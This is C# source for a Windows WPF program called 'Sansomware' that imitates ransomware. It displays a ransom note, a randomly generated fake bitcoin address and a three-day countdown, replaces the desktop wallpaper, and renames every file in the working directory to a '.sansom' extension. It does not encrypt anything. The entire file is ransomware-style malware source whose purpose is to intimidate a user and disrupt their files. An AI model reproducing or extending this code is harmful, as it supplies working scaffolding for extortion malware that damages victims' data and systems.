using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Runtime.InteropServices;

namespace Sansomware
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        DispatcherTimer dispatcherTimer;
        TimeSpan time;

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public MainWindow()
        {
            InitializeComponent();

            bitcoinAddress.Text = bitcoinString(30);

            ransomNote.Text = Sansomware.Properties.Resources.note;

            time = TimeSpan.FromDays(3);
            dispatcherTimer = new DispatcherTimer();
            dispatcherTimer.Interval = TimeSpan.FromSeconds(1);
            dispatcherTimer.Tick += countdownTimer;
            dispatcherTimer.Start();

            string wallpaper = "wallpaper.bmp";

            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, wallpaper, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

            string[] filepath = Directory.GetFiles(Directory.GetCurrentDirectory());
            changeExtension(filepath);
        }

        private void countdownTimer(object sender, EventArgs e)
        {
            if (time == TimeSpan.Zero) dispatcherTimer.Stop();
            else
            {
                time = time.Add(TimeSpan.FromSeconds(-1));
                countDown.Text = time.ToString("c");
            }
        }

        public string bitcoinString(int length)
        {
            StringBuilder stringBuild = new StringBuilder();
            Random random = new Random();

            char letter;

            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                letter = Convert.ToChar(shift + 65);
                stringBuild.Append(letter);
            }

            return stringBuild.ToString();
        }

        public void changeExtension(string[] path)
        {
            string filename;

            foreach (string file in path)
            {
                if(file != "Sansomware.exe")
                {
                    filename = System.IO.Path.ChangeExtension(file, ".sansom");
                    System.IO.File.Move(file, filename);
                }
            }
        }

        private void TextBox_TextChanged(object sender, TextChangedEventArgs e)
        {

        }
    }
}
